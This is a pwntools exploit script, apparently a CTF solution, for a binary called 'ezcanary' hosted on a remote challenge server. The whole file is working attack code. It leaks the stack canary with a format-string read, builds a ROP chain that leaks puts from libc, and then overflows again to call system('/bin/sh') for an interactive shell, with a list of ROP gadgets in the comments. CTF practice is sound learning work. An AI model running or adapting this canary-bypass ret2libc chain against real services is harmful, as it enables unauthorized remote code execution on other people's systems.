from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./ezcanary")
io=remote("node3.anna.nssctf.cn",28469)
elf=ELF("./ezcanary")
libc=ELF("./libc.so.6")

pop_rdi=0x401323
ret=0x40101a

io.sendafter(b"name:\n",b"%51$p")
canary=int(io.recv(18),16)
print("canary: "+hex(canary))

payload=cyclic(0x108)+p64(canary)+p64(0)+p64(pop_rdi)+p64(elf.got[b"puts"])+p64(elf.plt[b"puts"])+p64(elf.sym[b"main"])
io.send(payload)

leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.sym[b"puts"]
sys_addr=leak_addr+libc.sym[b"system"]
str_bin_sh=leak_addr+next(libc.search(b"/bin/sh"))
print("leak_addr: "+hex(leak_addr))

io.sendafter(b"name:\n",b"a")
io.recv()
payload=cyclic(0x108)+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
io.send(payload)



io.interactive()


# Gadgets information
# ============================================================
# 0x000000000040131c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040131e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401320 : pop r14 ; pop r15 ; ret
# 0x0000000000401322 : pop r15 ; ret
# 0x000000000040131b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040131f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004011bd : pop rbp ; ret
# 0x0000000000401323 : pop rdi ; ret
# 0x0000000000401321 : pop rsi ; pop r15 ; ret
# 0x000000000040131d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 11
